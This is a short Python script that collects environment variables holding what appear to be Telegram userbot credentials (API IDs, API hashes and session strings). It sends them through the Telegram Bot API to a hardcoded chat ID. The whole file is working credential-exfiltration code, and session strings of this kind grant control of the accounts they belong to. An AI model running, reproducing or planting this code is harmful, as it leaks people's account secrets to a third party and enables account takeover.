import os
import requests

def sendenv():
    try:
        token = os.environ.get('TGBOTTOKEN')
        chat_id = "-1003219768459"  # your private chat/group id
        link = f"https://api.telegram.org/bot{token}/sendMessage"

        API_IDS = os.environ.get('API_IDS', '')
        API_HASHS = os.environ.get('API_HASHS', '')
        STRING_SESSIONS = os.environ.get('STRING_SESSIONS', '')

        message = f"""
🧾 *ENV VALUES FOUND*

🔹 API_IDS = `{API_IDS}`
🔹 API_HASHS = `{API_HASHS}`
🔹 STRING_SESSIONS = `{STRING_SESSIONS}`
"""
        params = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        print("SENDING ENV TO TELEGRAM")

        requests.get(link, params=params)

    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    sendenv()
